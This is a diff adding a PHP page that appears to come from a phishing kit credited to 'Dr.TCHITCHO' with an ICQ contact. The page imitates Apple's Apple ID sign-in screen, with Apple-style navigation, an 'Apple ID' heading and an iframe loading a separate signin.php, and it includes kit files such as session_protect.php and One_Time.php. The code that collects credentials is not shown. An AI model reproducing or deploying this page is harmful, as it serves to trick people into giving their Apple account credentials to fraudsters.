@@ -1,0 +1,109 @@
+<?php @error_reporting(0);
+/*
+Dr.TCHITCHO = ICQ: 673729917
+*/ 
+require "assets/includes/session_protect.php";
+require "assets/includes/functions.php";
+require "lang.php";
+require "assets/includes/language.php";
+require "assets/includes/One_Time.php";
+require "assets/includes/enc.php";
+?>
+<!DOCTYPE html>
+<html>
+<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+<title><?php echo $judul ?></title>
+<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
+<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
+<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
+<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
+</head>
+<body id="pagecontent">
+<div id="content">
+<div class="bdd45">
+<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
+<div class="HeaderObjHolder">
+<ul class="MobHeader">
+<li class="HeaderObj MobMenIconH">
+<label class="MobMenHol">
+<span class="MobMenIcon MobMenIcon-top">
+<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
+<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
+</label>
+</li>
+<li class="HeaderObj">
+<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
+<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+</li>
+</ul>
+<ul class="HeaderObjList">
+<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
+<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
+<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
+<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
+<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
+<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
+<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
+<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
+<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
+<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
+</ul>
+</div>
+</nav>
+<div class="subnav">
+<div class="container">
+<div class="title pull-left" style="font-size:25px;font-weight:200px;"><?php echo $apple ?></div>
+<div class="menu-wrapper pull-right">
+<ul class="menu">
+<li class="item active"><a class="btn btn-link btn-signin" href="#"><?php echo $masuk ?></a></li>
+<li class="item"><a class="btn btn-link btn-create" href="#"><?php echo $buat ?></a></li>
+<li class="item"><a class="btn btn-link btn-faq" href="#"><?php echo $tanya ?></a></li>
+</ul>
+</div>
+</div>
+</div>
+<div class="paws signin">
+<h1 class="LoginTitle">Apple&nbsp;ID</h1>
+<div class="LoginIframe" id="auth-container" style="position: relative;">
+<iframe width="100%" height="100%" name="login" id="login" src="assets/signin.php" frameborder="0" scrolling="no"></iframe>
+</div>
+</div>
+<div id="flow">
+<div class="flow-body signin clearfix" role="main">
+<div class="container">
+<div class="forgot" id="forgot-link"><a href="#" style="font-size:16px"><?php echo $lupa ?></a></div>
+<div class="flex home-content">
+<script>
+		if (screen.width <= 699) {
+		    document.write('<br><br><h2 id="Title" style="font-size:25px; font-weight:620" class="title separator"><?php echo $akun ?></h2>');
+		} else {
+		    document.write('<h2 id="Title" style="font-size:32px; font-weight:620" class="title separator"><?php echo $akun ?></h2>');
+		}
+</script>
+<div id="TitleMsg" class="intro"><?php echo $cukup ?></div>
+<div id="LearnMore" class="intro"><a class="button faq-link" href="#"><?php echo $pelajari ?> <i class="icon Righty"></i></a></div>
+<script>
+		if (screen.width <= 699) {
+		    document.write('<center><img  src="assets/img/icon_mobile.png" height="170" width="330"></center>');
+		} else {
+		    document.write('<div id="AppIconsWrapper" class="apps text-center"><img class="ApplicationIcons" src="assets/img/icons.jpg" height="68" width="656"></div>');
+		}
+</script>
+<div id="CreateAccount" class="intro create show"><a class="button create-link" href="#"><?php echo $buat ?><i class="icon Righty"></i></a></div>
+</div>
+</div>
+</div>
+</div>
+<?php
+if (isMobileDevice()){
+include("assets/footermob.php");
+} else {
+include("assets/footer.php");
+}
+?>
+</div>
+</div>
+</body>
+</html>
